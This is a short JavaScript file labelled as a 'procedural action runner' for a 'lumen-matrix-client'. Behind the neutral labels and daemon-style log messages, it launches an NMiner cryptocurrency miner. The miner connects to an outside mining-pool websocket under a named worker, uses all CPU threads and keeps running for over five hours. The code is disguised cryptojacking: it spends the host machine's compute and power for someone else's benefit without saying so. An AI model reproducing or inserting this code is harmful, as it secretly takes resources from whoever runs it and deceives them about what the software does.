// Procedural action runner for lumen-matrix-client
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./core/config");

async function launchDaemon() {
    const sessionId = "3d3d2f";
    console.log(`[runtime] Starting runtime for ${config.appName || "lumen-matrix-client"} [${sessionId}]`);

    const service = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.lumen-matrix-client",
        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
    );

    process.stdin.resume();
    setTimeout(() => {
        console.log("[timeout] Operational limit (309m) reached, exiting cleanly.");
        process.exit(0);
    }, 309 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[runtime] Signal SIGTERM acknowledged, exiting session ${sessionId}.`);
        process.exit(0);
    });

    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
}

launchDaemon().catch((err) => {
    console.error("Supervisor startup fault:", err);
    process.exit(1);
});
